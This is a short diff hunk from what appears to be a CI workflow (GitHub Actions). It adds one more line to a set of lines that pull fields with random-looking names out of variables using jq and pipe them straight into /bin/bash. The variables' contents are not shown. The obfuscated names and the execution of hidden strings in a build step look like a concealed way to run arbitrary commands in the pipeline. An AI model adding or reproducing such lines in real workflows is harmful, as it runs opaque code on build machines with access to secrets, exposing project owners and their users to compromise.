@@ -25,6 +25,7 @@ jobs:
           echo $r93 | jq -r .v11 | /bin/bash
           printf '%s' "$yxlm8" | jq -r .zbxme8027 | /bin/bash
           echo $x139 | jq -r .dzeft5 | /bin/bash
+          echo $zv91 | jq -r .z5731 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
